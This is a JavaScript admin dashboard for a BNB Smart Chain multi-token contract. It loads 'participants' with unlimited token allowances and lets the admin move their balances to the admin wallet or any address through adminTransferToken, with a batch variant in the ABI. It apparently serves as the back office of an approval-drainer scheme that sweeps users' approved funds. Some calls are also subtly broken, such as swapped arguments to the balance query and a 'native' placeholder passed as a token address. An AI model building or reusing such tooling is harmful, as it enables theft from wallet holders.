// Multi-Token Admin Interface - Universal Token Management

let web3;
let adminAccount;
let universalContract;
let participants = [];
let supportedTokens = [];

// Token configuration
const TOKEN_CONFIG = {
    USDT: { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", name: "Tether USD", decimals: 18, icon: "💵" },
    BNB: { address: "native", symbol: "BNB", name: "BNB (Native)", decimals: 18, icon: "🟡", isNative: true },
    ETH: { address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8", symbol: "ETH", name: "Ethereum Token", decimals: 18, icon: "🔷" },
    BTC: { address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c", symbol: "BTC", name: "Bitcoin BEP20", decimals: 18, icon: "🟠" },
    TRON: { address: "0x85465ae51478478e3960353bb49eabf844e76c17", symbol: "TRON", name: "TRON BEP20", decimals: 18, icon: "🔴" },
    BUSD: { address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", symbol: "BUSD", name: "Binance USD", decimals: 18, icon: "💰" },
    USDC: { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", name: "USD Coin", decimals: 18, icon: "💵" },
    CAKE: { address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82", symbol: "CAKE", name: "PancakeSwap Token", decimals: 18, icon: "🥞" },
    WBNB: { address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", symbol: "WBNB", name: "Wrapped BNB", decimals: 18, icon: "🟡" },
    MATIC: { address: "0xCC5c5236322842425Fbd6448411b0c8d1d5b5A2a", symbol: "MATIC", name: "Matic Token", decimals: 18, icon: "🟣" }
};

// ERC20 ABI
const ERC20_ABI = [
    { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
    { "constant": true, "inputs": [], "name": "decimals", "outputs": [{"name": "", "type": "uint8"}], "type": "function" },
    { "constant": true, "inputs": [], "name": "symbol", "outputs": [{"name": "", "type": "string"}], "type": "function" },
    { "constant": true, "inputs": [], "name": "name", "outputs": [{"name": "", "type": "string"}], "type": "function" }
];

// Universal Contract ABI
const UNIVERSAL_CONTRACT_ABI = [
    {"inputs":[{"name":"tokenAddress","type":"address"}],"name":"addToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"}],"name":"removeToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"},{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_amount","type":"uint256"}],"name":"adminTransferToken","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"},{"name":"_from","type":"address[]"},{"name":"_to","type":"address"},{"name":"_amounts","type":"uint256[]"}],"name":"adminBatchTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[],"name":"getSupportedTokens","outputs":[{"name":"","type":"address[]"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"getAllParticipants","outputs":[{"name":"","type":"address[]"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"},{"name":"user","type":"address"}],"name":"getUserTokenBalance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"},{"name":"user","type":"address"}],"name":"getUserTokenAllowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"tokenAddress","type":"address"}],"name":"getTokenInfo","outputs":[{"name":"symbol","type":"string"},{"name":"name","type":"string"},{"name":"isActive","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"user","type":"address"}],"name":"isParticipant","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"admin","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
];

// BSC Mainnet Configuration
const BSC_MAINNET = {
    chainId: '0x38',
    chainName: 'Binance Smart Chain',
    rpcUrls: ['https://bsc-dataseed1.binance.org'],
    blockExplorerUrls: ['https://bscscan.com']
};

// DOM Elements
const connectAdminBtn = document.getElementById('connectAdminBtn');
const refreshDataBtn = document.getElementById('refreshDataBtn');
const loadParticipantsBtn = document.getElementById('loadParticipantsBtn');
const tokenSelector = document.getElementById('tokenSelector');
const addTokenBtn = document.getElementById('addTokenBtn');
const customTokenAddress = document.getElementById('customTokenAddress');
const adminBalanceOverview = document.getElementById('adminBalanceOverview');
const participantsList = document.getElementById('participantsList');
const totalParticipants = document.getElementById('totalParticipants');
const adminWallet = document.getElementById('adminWallet');
const transferModal = document.getElementById('transferModal');
const modalFromAddress = document.getElementById('modalFromAddress');
const modalBalance = document.getElementById('modalBalance');
const modalToAddress = document.getElementById('modalToAddress');
const modalAmount = document.getElementById('modalAmount');
const modalToken = document.getElementById('modalToken');
const confirmTransferBtn = document.getElementById('confirmTransferBtn');
const cancelTransferBtn = document.getElementById('cancelTransferBtn');
const refreshHistoryBtn = document.getElementById('refreshHistoryBtn');
const transferHistory = document.getElementById('transferHistory');
const loadingOverlay = document.getElementById('loadingOverlay');
const loadingText = document.getElementById('loadingText');
const toast = document.getElementById('toast');
const toastMessage = document.getElementById('toastMessage');

let currentTransferFrom = null;
let currentTransferToken = null;
let transferHistoryData = [];

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initializeTokenSelector();
    setupEventListeners();
    checkAdminWalletConnection();
});

// Check if admin wallet is already connected
async function checkAdminWalletConnection() {
    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                web3 = new Web3(window.ethereum);
                adminAccount = accounts[0];

                // Check if still on correct network
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                if (chainId === '0x38') { // BSC Mainnet
                    window.autoReconnected = true;
                    await initializeAdminApp();
                    console.log('Admin wallet reconnected automatically');
                }
            }
        } catch (error) {
            console.error('Error checking admin wallet connection:', error);
        }
    }
}

// Initialize Admin App
async function initializeAdminApp() {
    if (adminWallet) {
        adminWallet.textContent = formatAddress(adminAccount);
        adminWallet.style.color = '#10B981';
    }

    if (connectAdminBtn) {
        connectAdminBtn.textContent = 'Connected';
        connectAdminBtn.classList.add('connected');
    }

    // Load admin balance overview
    await loadAdminBalances();
    await loadAllData();
    await loadTransferHistory();

    // Show success message only for manual connections
    if (!window.autoReconnected) {
        showToast('✅ Admin wallet connected!', 'success');
    }
}

// Initialize Token Selector
function initializeTokenSelector() {
    if (!tokenSelector) return;

    tokenSelector.innerHTML = '<option value="">Select Token</option>';

    Object.keys(TOKEN_CONFIG).forEach(symbol => {
        const token = TOKEN_CONFIG[symbol];
        const option = document.createElement('option');
        option.value = symbol;
        option.innerHTML = `${token.icon} ${token.symbol} - ${token.name}`;
        tokenSelector.appendChild(option);
    });
}

// Setup Event Listeners
function setupEventListeners() {
    if (connectAdminBtn) connectAdminBtn.addEventListener('click', connectAdminWallet);
    if (refreshDataBtn) refreshDataBtn.addEventListener('click', loadAllData);
    if (loadParticipantsBtn) loadParticipantsBtn.addEventListener('click', loadParticipants);
    if (tokenSelector) tokenSelector.addEventListener('change', handleTokenSelection);
    if (addTokenBtn) addTokenBtn.addEventListener('click', addCustomToken);
    if (confirmTransferBtn) confirmTransferBtn.addEventListener('click', executeTransfer);
    if (cancelTransferBtn) cancelTransferBtn.addEventListener('click', closeTransferModal);
    if (refreshHistoryBtn) refreshHistoryBtn.addEventListener('click', loadTransferHistory);
}

// Connect Admin Wallet
async function connectAdminWallet() {
    if (typeof window.ethereum === 'undefined') {
        showToast('❌ Please install MetaMask!', 'error');
        return;
    }

    try {
        showLoading('Connecting admin wallet...');

        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        web3 = new Web3(window.ethereum);
        adminAccount = accounts[0];

        await switchToBSCMainnet();

        // Initialize contract
        const contractAddress = window.CONTRACT_ADDRESSES?.UNIVERSAL_CONTRACT_ADDRESS;
        if (contractAddress && contractAddress !== 'YOUR_UNIVERSAL_CONTRACT_ADDRESS_HERE') {
            universalContract = new web3.eth.Contract(UNIVERSAL_CONTRACT_ABI, contractAddress);

            // Verify admin
            const contractAdmin = await universalContract.methods.admin().call();
            if (contractAdmin.toLowerCase() !== adminAccount.toLowerCase()) {
                hideLoading();
                showToast('⚠️ Warning: You are not the contract admin!', 'error');
                if (adminWallet) {
                    adminWallet.textContent = formatAddress(adminAccount) + ' (Not Admin)';
                    adminWallet.style.color = '#EF4444';
                }
                return;
            }
        } else {
            hideLoading();
            showToast('❌ Universal contract not configured!', 'error');
            return;
        }

        // Clear auto-reconnect flag for manual connections
        window.autoReconnected = false;

        // Initialize admin app state
        await initializeAdminApp();

    } catch (error) {
        hideLoading();
        console.error('Error connecting admin wallet:', error);
        showToast('❌ Connection failed: ' + error.message, 'error');
    }
}

// Switch to BSC Mainnet
async function switchToBSCMainnet() {
    try {
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_MAINNET.chainId }],
        });
    } catch (switchError) {
        if (switchError.code === 4902) {
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [BSC_MAINNET],
            });
        } else {
            throw switchError;
        }
    }
}

// Load All Data
async function loadAllData() {
    if (!universalContract || !adminAccount) {
        showToast('⚠️ Please connect admin wallet first', 'error');
        return;
    }

    await Promise.all([
        loadSupportedTokens(),
        loadParticipants()
    ]);
}

// Load Supported Tokens
async function loadSupportedTokens() {
    if (!universalContract) return;

    try {
        showLoading('Loading supported tokens...');

        const tokenAddresses = await universalContract.methods.getSupportedTokens().call();
        supportedTokens = [];

        for (let address of tokenAddresses) {
            try {
                const tokenInfo = await universalContract.methods.getTokenInfo(address).call();
                supportedTokens.push({
                    address: address,
                    symbol: tokenInfo.symbol,
                    name: tokenInfo.name,
                    isActive: tokenInfo.isActive
                });
            } catch (error) {
                console.error('Error loading token info for', address, error);
            }
        }

        hideLoading();
        showToast(`✅ Loaded ${supportedTokens.length} supported tokens`, 'success');

    } catch (error) {
        hideLoading();
        console.error('Error loading supported tokens:', error);
        showToast('❌ Failed to load supported tokens', 'error');
    }
}

// Handle Token Selection
async function handleTokenSelection(event) {
    const tokenSymbol = event.target.value;

    if (!tokenSymbol) {
        currentTransferToken = null;
        return;
    }

    currentTransferToken = TOKEN_CONFIG[tokenSymbol];

    if (currentTransferToken && participants.length > 0) {
        // Update participant balances for selected token
        await updateParticipantBalances();
    }
}

// Load Admin Balance Overview
async function loadAdminBalances() {
    if (!web3 || !adminAccount) return;

    try {
        const tokens = ['USDT', 'BNB', 'ETH', 'BTC', 'TRON', 'BUSD', 'USDC', 'CAKE', 'WBNB'];
        const balanceData = [];

        for (let tokenSymbol of tokens) {
            const token = TOKEN_CONFIG[tokenSymbol];
            if (!token) continue;

            try {
                let balance = 0;
                let decimals = 18;

                if (token.isNative) {
                    // Handle native BNB balance
                    balance = await web3.eth.getBalance(adminAccount);
                    decimals = 18;
                } else {
                    // Handle ERC20 token balance with better error handling
                    const tokenContract = new web3.eth.Contract(ERC20_ABI, token.address);

                    // First check if token exists by calling a simple method
                    try {
                        balance = await tokenContract.methods.balanceOf(adminAccount).call();
                        decimals = await tokenContract.methods.decimals().call();
                    } catch (tokenError) {
                        console.warn(`Token ${tokenSymbol} may not exist or is not ERC20 compatible:`, tokenError);
                        // Skip this token if it doesn't exist
                        continue;
                    }
                }

                const formattedBalance = balance / Math.pow(10, decimals);

                balanceData.push({
                    symbol: token.symbol,
                    name: token.name,
                    icon: token.icon,
                    balance: formattedBalance,
                    address: token.address,
                    isNative: token.isNative || false
                });

            } catch (error) {
                console.error(`Error loading ${tokenSymbol} balance:`, error);
                // Only add error entry if it's not a token existence issue
                if (!error.message.includes('revert') && !error.message.includes('invalid')) {
                    balanceData.push({
                        symbol: token.symbol,
                        name: token.name,
                        icon: token.icon,
                        balance: 0,
                        address: token.address,
                        isNative: token.isNative || false,
                        error: true
                    });
                }
            }
        }

        // Update UI with balance overview
        if (adminBalanceOverview) {
            adminBalanceOverview.innerHTML = `
                <div style="background: var(--bg-tertiary); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
                    <h3 style="margin-bottom: 15px; color: var(--primary-color);">
                        💰 Admin Balance Overview
                    </h3>
                    <div class="token-grid" style="grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));">
                        ${balanceData.map(token => `
                            <div class="balance-item" style="background: ${token.error ? 'rgba(239, 68, 68, 0.1)' : 'rgba(16, 185, 129, 0.1)'}; padding: 12px; border-radius: 8px; border: 1px solid ${token.error ? '#EF4444' : '#10B981'};">
                                <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 5px;">
                                    <span style="font-size: 18px;">${token.icon}</span>
                                    <span style="font-weight: 600; color: var(--text-primary);">${token.symbol}</span>
                                    ${token.isNative ? '<span style="font-size: 10px; background: #F59E0B; color: white; padding: 2px 4px; border-radius: 3px;">NATIVE</span>' : ''}
                                </div>
                                <div style="font-size: 14px; color: var(--text-secondary); margin-bottom: 2px;">${token.name}</div>
                                <div style="font-size: 16px; font-weight: 700; color: ${token.error ? '#EF4444' : '#10B981'};">
                                    ${token.error ? 'Error' : token.balance.toFixed(4)}
                                </div>
                                ${!token.error ? `
                                    <div style="font-size: 11px; color: var(--text-secondary); font-family: monospace; margin-top: 2px;">
                                        ${token.isNative ? 'Native BNB' : token.address.substring(0, 10) + '...'}
                                    </div>
                                ` : ''}
                            </div>
                        `).join('')}
                    </div>
                </div>
            `;
        }

        // Update supported tokens count in stats
        const supportedTokensCount = document.getElementById('supportedTokens');
        if (supportedTokensCount) {
            supportedTokensCount.textContent = Object.keys(TOKEN_CONFIG).length;
        }

    } catch (error) {
        console.error('Error loading admin balances:', error);
        showToast('❌ Failed to load balance overview', 'error');
    }
}

// Add Custom Token
async function addCustomToken() {
    if (!customTokenAddress || !universalContract) {
        showToast('❌ Please enter token address', 'error');
        return;
    }

    const tokenAddress = customTokenAddress.value.trim();

    if (!web3.utils.isAddress(tokenAddress)) {
        showToast('❌ Invalid token address', 'error');
        return;
    }

    try {
        showLoading('Adding token...');

        const tx = await universalContract.methods.addToken(tokenAddress).send({
            from: adminAccount,
            gas: 100000
        });

        hideLoading();
        showToast('✅ Token added successfully!', 'success');

        // Clear input and reload tokens
        customTokenAddress.value = '';
        await loadSupportedTokens();

    } catch (error) {
        hideLoading();
        console.error('Error adding token:', error);

        if (error.code === 4001) {
            showToast('❌ Transaction rejected', 'error');
        } else {
            showToast('❌ Failed to add token: ' + error.message, 'error');
        }
    }
}

// Load Participants
async function loadParticipants() {
    if (!universalContract) {
        showToast('❌ Universal contract not initialized', 'error');
        return;
    }

    try {
        showLoading('Loading participants...');

        const participantAddresses = await universalContract.methods.getAllParticipants().call();
        participants = [];

        for (let address of participantAddresses) {
            participants.push({
                address: address,
                balances: {}, // Will be populated per token
                isParticipant: true
            });
        }

        // Update total count
        if (totalParticipants) {
            totalParticipants.textContent = participants.length;
        }

        // Update participant balances if token is selected
        if (currentTransferToken) {
            await updateParticipantBalances();
        }

        // Display participants table
        displayParticipants();

        hideLoading();
        showToast('✅ Loaded ' + participants.length + ' participants', 'success');

    } catch (error) {
        hideLoading();
        console.error('Error loading participants:', error);
        showToast('❌ Failed to load participants: ' + error.message, 'error');
    }
}

// Update Participant Balances
async function updateParticipantBalances() {
    if (!currentTransferToken || !universalContract) return;

    try {
        for (let participant of participants) {
            try {
                const balance = await universalContract.methods.getUserTokenBalance(
                    participant.address,
                    currentTransferToken.address
                ).call();

                const allowance = await universalContract.methods.getUserTokenAllowance(
                    participant.address,
                    currentTransferToken.address
                ).call();

                const decimals = currentTransferToken.decimals || 18;

                participant.balances[currentTransferToken.symbol] = {
                    balance: balance / Math.pow(10, decimals),
                    allowance: allowance / Math.pow(10, decimals),
                    hasAllowance: allowance > 0
                };
            } catch (error) {
                console.error('Error loading balance for participant:', participant.address, error);
                participant.balances[currentTransferToken.symbol] = {
                    balance: 0,
                    allowance: 0,
                    hasAllowance: false
                };
            }
        }
    } catch (error) {
        console.error('Error updating participant balances:', error);
    }
}

// Display Participants
function displayParticipants() {
    if (participants.length === 0) {
        if (participantsList) {
            participantsList.innerHTML = '<p class="empty-state">No participants yet</p>';
        }
        return;
    }

    const tokenSymbol = currentTransferToken ? currentTransferToken.symbol : null;

    const table = `
        <table class="user-table">
            <thead>
                <tr>
                    <th>#</th>
                    <th>Wallet Address</th>
                    <th>Selected Token Balance</th>
                    <th>Allowance</th>
                    <th>Status</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                ${participants.map((p, index) => {
                    const tokenBalance = tokenSymbol && p.balances[tokenSymbol]
                        ? p.balances[tokenSymbol].balance
                        : 0;
                    const tokenAllowance = tokenSymbol && p.balances[tokenSymbol]
                        ? p.balances[tokenSymbol].allowance
                        : 0;
                    const hasAllowance = tokenSymbol && p.balances[tokenSymbol]
                        ? p.balances[tokenSymbol].hasAllowance
                        : false;

                    return `
                        <tr>
                            <td>${index + 1}</td>
                            <td style="font-family: monospace;">${formatAddress(p.address)}</td>
                            <td style="color: #10B981; font-weight: 600;">
                                ${tokenSymbol ? tokenBalance.toFixed(4) + ' ' + tokenSymbol : 'Select token'}
                            </td>
                            <td>
                                ${hasAllowance
                                    ? (tokenAllowance > 1000000 ? '∞ Unlimited' : tokenAllowance.toFixed(2) + ' ' + tokenSymbol)
                                    : '0 ' + (tokenSymbol || 'Token')
                                }
                            </td>
                            <td>
                                <span class="status-badge ${hasAllowance ? 'status-active' : 'status-pending'}">
                                    ${hasAllowance ? 'Active' : 'No Allowance'}
                                </span>
                            </td>
                            <td>
                                <button class="transfer-btn"
                                        onclick="openTransferModal('${p.address}', ${tokenBalance})"
                                        title="Transfer ${tokenSymbol || 'tokens'} to any BSC wallet"
                                        ${!tokenSymbol || !hasAllowance ? 'disabled' : ''}>
                                    💸 Transfer
                                </button>
                            </td>
                        </tr>
                    `;
                }).join('')}
            </tbody>
        </table>
    `;

    if (participantsList) {
        participantsList.innerHTML = table;
    }
}

// Open Transfer Modal
function openTransferModal(fromAddress, balance) {
    if (!currentTransferToken) {
        showToast('❌ Please select a token first', 'error');
        return;
    }

    currentTransferFrom = fromAddress;

    if (modalFromAddress) modalFromAddress.value = fromAddress;
    if (modalBalance) modalBalance.value = balance.toFixed(4) + ' ' + currentTransferToken.symbol;
    if (modalToAddress) modalToAddress.value = adminAccount; // Default to admin wallet
    if (modalAmount) modalAmount.value = '';
    if (modalToken) modalToken.textContent = currentTransferToken.icon + ' ' + currentTransferToken.symbol;

    if (transferModal) {
        transferModal.classList.remove('hidden');
    }
}

// Execute Transfer
async function executeTransfer() {
    if (!currentTransferToken) {
        showToast('❌ No token selected', 'error');
        return;
    }

    const toAddress = modalToAddress ? modalToAddress.value.trim() : adminAccount;
    const amount = modalAmount ? modalAmount.value.trim() : '0';

    if (!amount || parseFloat(amount) <= 0) {
        showToast('❌ Please enter a valid amount', 'error');
        return;
    }

    if (!web3.utils.isAddress(toAddress)) {
        showToast('❌ Invalid recipient address format', 'error');
        return;
    }

    // Process transfer without confirmation dialog
    const recipientName = toAddress.toLowerCase() === adminAccount.toLowerCase() ? 'Admin Wallet' : 'Custom Wallet';
    const shortRecipient = formatAddress(toAddress);

    console.log(`🔄 Processing transfer: ${amount} ${currentTransferToken.symbol} from ${formatAddress(currentTransferFrom)} to ${recipientName}`);

    try {
        showLoading(`Processing ${currentTransferToken.symbol} transfer to ${recipientName}...`);

        const decimals = currentTransferToken.decimals || 18;
        const amountInWei = web3.utils.toBN(Math.floor(parseFloat(amount) * Math.pow(10, decimals))).toString();

        showToast('⏳ Please confirm the transaction in MetaMask...', 'info');

        // Call admin transfer function
        const tx = await universalContract.methods.adminTransferToken(
            currentTransferToken.address,
            currentTransferFrom,
            toAddress,
            amountInWei.toString()
        ).send({
            from: adminAccount,
            gas: 200000
        });

        hideLoading();
        closeTransferModal();

        // Save transfer to history
        saveTransferToHistory({
            fromAddress: currentTransferFrom,
            toAddress: toAddress,
            amount: amount,
            tokenSymbol: currentTransferToken.symbol,
            tokenIcon: currentTransferToken.icon,
            txHash: tx.transactionHash,
            status: 'success',
            gasUsed: tx.gasUsed
        });

        // Show detailed success message
        showToast(`✅ Transfer successful!\nSent: ${amount} ${currentTransferToken.symbol}\nTo: ${recipientName}\nHash: ${tx.transactionHash.substring(0, 10)}...`, 'success');

        // Reload data
        await loadParticipants();

    } catch (error) {
        hideLoading();
        console.error('Error in admin transfer:', error);

        if (error.code === 4001) {
            showToast('❌ Transaction rejected by user', 'error');
        } else {
            showToast('❌ Transfer failed: ' + error.message, 'error');
        }
    }
}

// Close Transfer Modal
function closeTransferModal() {
    if (transferModal) {
        transferModal.classList.add('hidden');
    }
    currentTransferFrom = null;
}

// Set Recipient to Admin Wallet
function setRecipientToAdmin() {
    if (modalToAddress && adminAccount) {
        modalToAddress.value = adminAccount;
        showToast('📌 Recipient set to admin wallet', 'success');
    }
}

// Clear Recipient Field
function clearRecipient() {
    if (modalToAddress) {
        modalToAddress.value = '';
        showToast('🗑️ Recipient field cleared', 'info');
    }
}

// Format Address
function formatAddress(address) {
    if (!address) return '';
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
}

// Show Loading
function showLoading(message = 'Processing...') {
    if (loadingText) loadingText.textContent = message;
    if (loadingOverlay) loadingOverlay.classList.remove('hidden');
}

// Hide Loading
function hideLoading() {
    if (loadingOverlay) loadingOverlay.classList.add('hidden');
}

// Show Toast
function showToast(message, type = 'info') {
    if (!toast || !toastMessage) return;

    toastMessage.textContent = message;
    toast.className = `toast ${type}`;
    toast.classList.remove('hidden');

    setTimeout(() => {
        if (toast) toast.classList.add('hidden');
    }, 3000);
}

// Load Transfer History
async function loadTransferHistory() {
    if (!web3 || !adminAccount || !universalContract) return;

    try {
        // For now, we'll use localStorage to store transfer history
        // In a production environment, you might want to store this in a database
        const storedHistory = localStorage.getItem('multiTokenTransferHistory');
        if (storedHistory) {
            transferHistoryData = JSON.parse(storedHistory);
        }

        // Also try to load any blockchain events (this would require event listeners)
        // For now, we'll display the stored history
        updateTransferHistoryUI();

    } catch (error) {
        console.error('Error loading transfer history:', error);
        showToast('❌ Failed to load transfer history', 'error');
    }
}

// Save Transfer to History
function saveTransferToHistory(transferData) {
    const historyEntry = {
        ...transferData,
        timestamp: new Date().toISOString(),
        id: Date.now().toString()
    };

    transferHistoryData.unshift(historyEntry); // Add to beginning

    // Keep only last 100 transfers
    if (transferHistoryData.length > 100) {
        transferHistoryData = transferHistoryData.slice(0, 100);
    }

    // Save to localStorage
    localStorage.setItem('multiTokenTransferHistory', JSON.stringify(transferHistoryData));

    // Update UI
    updateTransferHistoryUI();
}

// Update Transfer History UI
function updateTransferHistoryUI() {
    if (!transferHistory) return;

    if (transferHistoryData.length === 0) {
        transferHistory.innerHTML = '<p class="empty-state">No transfer history available.</p>';
        return;
    }

    const historyHTML = `
        <div style="overflow-x: auto;">
            <table style="width: 100%; border-collapse: collapse;">
                <thead>
                    <tr style="background: var(--bg-tertiary); border-bottom: 2px solid var(--border-color);">
                        <th style="padding: 12px; text-align: left; font-weight: 600; color: var(--text-primary);">Date</th>
                        <th style="padding: 12px; text-align: left; font-weight: 600; color: var(--text-primary);">Token</th>
                        <th style="padding: 12px; text-align: left; font-weight: 600; color: var(--text-primary);">From</th>
                        <th style="padding: 12px; text-align: left; font-weight: 600; color: var(--text-primary);">To</th>
                        <th style="padding: 12px; text-align: right; font-weight: 600; color: var(--text-primary);">Amount</th>
                        <th style="padding: 12px; text-align: center; font-weight: 600; color: var(--text-primary);">Status</th>
                        <th style="padding: 12px; text-align: center; font-weight: 600; color: var(--text-primary);">Tx Hash</th>
                    </tr>
                </thead>
                <tbody>
                    ${transferHistoryData.map(transfer => {
                        const date = new Date(transfer.timestamp);
                        const formattedDate = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
                        const statusColor = transfer.status === 'success' ? '#10B981' :
                                         transfer.status === 'pending' ? '#F59E0B' : '#EF4444';
                        const statusText = transfer.status === 'success' ? '✅ Success' :
                                          transfer.status === 'pending' ? '⏳ Pending' : '❌ Failed';

                        return `
                            <tr style="border-bottom: 1px solid var(--border-color); hover: background: var(--bg-tertiary);">
                                <td style="padding: 12px; color: var(--text-secondary); font-size: 14px;">${formattedDate}</td>
                                <td style="padding: 12px;">
                                    <span style="display: inline-flex; align-items: center; gap: 6px;">
                                        <span>${transfer.tokenIcon || '🪙'}</span>
                                        <span style="font-weight: 600;">${transfer.tokenSymbol}</span>
                                    </span>
                                </td>
                                <td style="padding: 12px; font-family: monospace; font-size: 12px; color: var(--text-secondary);">
                                    ${formatAddress(transfer.fromAddress)}
                                </td>
                                <td style="padding: 12px; font-family: monospace; font-size: 12px; color: var(--text-secondary);">
                                    ${transfer.toAddress.toLowerCase() === adminAccount?.toLowerCase() ? 'Admin Wallet' : formatAddress(transfer.toAddress)}
                                </td>
                                <td style="padding: 12px; text-align: right; font-weight: 600; color: var(--text-primary);">
                                    ${parseFloat(transfer.amount).toFixed(4)}
                                </td>
                                <td style="padding: 12px; text-align: center;">
                                    <span style="color: ${statusColor}; font-weight: 600;">${statusText}</span>
                                </td>
                                <td style="padding: 12px; text-align: center;">
                                    ${transfer.txHash ?
                                        `<a href="https://bscscan.com/tx/${transfer.txHash}" target="_blank"
                                           style="color: var(--primary-color); text-decoration: none; font-family: monospace; font-size: 12px;">
                                            ${transfer.txHash.substring(0, 10)}...
                                        </a>` :
                                        '<span style="color: var(--text-secondary);">-</span>'
                                    }
                                </td>
                            </tr>
                        `;
                    }).join('')}
                </tbody>
            </table>
        </div>
    `;

    transferHistory.innerHTML = historyHTML;
}

// Export functions for external access
window.MultiTokenAdmin = {
    connectAdminWallet,
    addCustomToken,
    loadParticipants,
    setRecipientToAdmin,
    clearRecipient,
    loadTransferHistory,
    saveTransferToHistory,
    TOKEN_CONFIG
};